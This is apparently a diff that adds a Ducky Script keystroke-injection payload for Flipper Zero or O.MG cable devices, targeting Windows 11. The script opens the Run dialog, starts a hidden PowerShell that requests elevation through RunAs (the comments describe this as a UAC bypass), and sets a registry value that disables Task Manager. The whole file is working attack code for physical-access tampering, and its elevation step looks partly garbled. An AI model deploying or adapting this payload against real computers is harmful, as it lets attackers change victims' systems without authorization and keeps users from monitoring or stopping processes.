@@ -1,0 +1,21 @@
+REM Author: hector(sasquatchchicken)
+REM Version 1.0 (Flipper Ducky / OMG Cable)
+REM Target: windows 11
+REM This badkb script bypasses UAC and elevating privileges on a Windows system to disable Task Manager by modifying the Windows registry
+DELAY 1000
+REM Open the Run dialog
+WINDOWS r
+DELAY 500
+REM Execute the COM Elevation Moniker method to open an elevated Command Prompt
+STRING powershell -windowstyle hidden -command "Start-Process 'cmd.exe' -ArgumentList '/c start /b COMSPEC' -Verb RunAs"
+ENTER
+DELAY 1000
+REM Ensure Command Prompt is running with elevated privileges
+REM Disable Task Manager by modifying the registry
+STRING powershell Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
+ENTER
+DELAY 500
+REM Close the PowerShell or Command Prompt window
+STRING exit
+ENTER
+DELAY 500
